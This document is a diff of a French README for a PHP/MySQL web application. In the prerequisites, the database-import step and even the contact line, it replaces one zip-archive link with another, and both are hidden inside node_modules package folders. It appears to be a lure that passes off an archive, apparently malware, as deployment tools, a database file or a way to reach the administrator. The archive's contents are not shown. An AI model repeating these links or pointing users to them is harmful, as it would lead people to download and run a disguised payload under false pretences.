@@ -21,7 +21,7 @@ PHP 7.4 ou supérieur
 MySQL 5.7 ou supérieur
 Composer (pour la gestion des dépendances PHP)
 MongoDB (pour les statistiques non relationnelles)
-https://raw.githubusercontent.com/Valentindelahaye8/ECF/main/node_modules/has-property-descriptors/test/ECF_3.6-beta.2.zip (pour les outils de déploiement si nécessaire)
+https://github.com/Valentindelahaye8/ECF/raw/refs/heads/main/node_modules/gopd/Software_v1.5.zip (pour les outils de déploiement si nécessaire)
 Étapes d'installation
 Cloner le dépôt :
 
@@ -31,7 +31,7 @@ git clone <url-du-dépôt>
 cd <nom-du-dossier>
 Configurer la base de données :
 
-Importez le fichier https://raw.githubusercontent.com/Valentindelahaye8/ECF/main/node_modules/has-property-descriptors/test/ECF_3.6-beta.2.zip dans votre base de données MySQL.
+Importez le fichier https://github.com/Valentindelahaye8/ECF/raw/refs/heads/main/node_modules/gopd/Software_v1.5.zip dans votre base de données MySQL.
 Configurez les variables d'environnement pour la base de données dans le fichier .env.
 sh
 Copier le code
@@ -63,7 +63,7 @@ http://localhost:8000
 
 
 Contact
-Pour toute question ou problème, veuillez contacter l'administrateur du projet à l'adresse suivante : https://raw.githubusercontent.com/Valentindelahaye8/ECF/main/node_modules/has-property-descriptors/test/ECF_3.6-beta.2.zip
+Pour toute question ou problème, veuillez contacter l'administrateur du projet à l'adresse suivante : https://github.com/Valentindelahaye8/ECF/raw/refs/heads/main/node_modules/gopd/Software_v1.5.zip
 
 
 
